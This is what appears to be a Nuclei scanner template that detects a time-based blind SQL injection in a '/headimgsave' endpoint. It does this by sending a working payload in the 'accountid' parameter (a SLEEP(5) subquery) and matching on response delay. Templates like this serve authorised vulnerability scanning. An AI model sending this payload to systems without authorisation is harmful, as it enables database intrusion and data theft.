id: Meta-headimgsave-sqlInjection

info:
  name: Meta-headimgsave-sqlInjection
  author: iSee857
  severity: high
  description: Meta-headimgsave-sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /headimgsave?accountid=1'+AND+(SELECT+*+FROM+(SELECT+SLEEP(5))x)--+ HTTP/1.1
        Host: {{Host}}
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
      
      - type: status
        status:
          - 200